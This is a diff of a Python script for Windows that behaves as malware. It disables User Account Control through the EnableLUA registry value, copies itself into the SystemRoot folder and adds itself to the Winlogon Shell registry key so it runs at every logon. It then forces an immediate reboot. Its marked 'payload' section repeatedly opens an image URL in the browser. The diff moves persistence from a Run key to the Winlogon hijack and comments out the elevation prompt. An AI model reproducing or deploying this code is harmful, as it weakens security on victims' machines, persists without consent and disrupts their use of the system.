@@ -14,25 +14,25 @@ ROOT_PATH = os.environ['SystemRoot']
 
 
 if __name__ == '__main__':
-    if sys.argv[-1] != ASADMIN:
-        script = os.path.abspath(sys.argv[0])
-        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-        sys.exit()
+    # if sys.argv[-1] != ASADMIN:
+    #     script = os.path.abspath(sys.argv[0])
+    #     params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    #     shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+    #     sys.exit()
 
     if os.path.isdir(os.path.join(ROOT_PATH,'Winx')) is False:
         # root 파일을 레지스트리에 등록
         try:
             os.mkdir(os.path.join(ROOT_PATH,'Winx'))
             os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
-            os.system(f'reg.exe ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /f /v Winx /t REG_SZ /d "{ROOT_PATH}\\{PROG_NAME}"')
-            os.system('shutdown /r /f /t 1')
-            os.system(os.path.join(ROOT_PATH,PROG_NAME))
+            os.system(f'reg.exe ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Shell /t REG_SZ /d "explorer.exe, {ROOT_PATH}\\{PROG_NAME}"')
             copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
+            os.system('shutdown /r /f /t 1')
         except FileExistsError:
             pass
         sys.exit()
     # Write your payload
+    print(f'/d "explorer.exe,{ROOT_PATH}\\{PROG_NAME}"')
     webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
     webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
     webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
